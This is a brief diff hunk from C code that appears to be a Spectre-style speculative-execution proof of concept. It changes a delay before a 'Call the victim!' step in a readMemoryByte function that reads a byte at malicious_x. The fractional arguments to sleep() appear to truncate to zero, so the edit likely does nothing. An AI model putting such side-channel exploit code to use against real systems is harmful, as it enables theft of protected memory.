@@ -76,7 +76,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
                  "movl $20, %ebx;"
                  "imull %ebx, %eax;"
       );
-      sleep(0.001);
+      sleep(0.01);
 
       /* Call the victim! */
       victim_function(x);
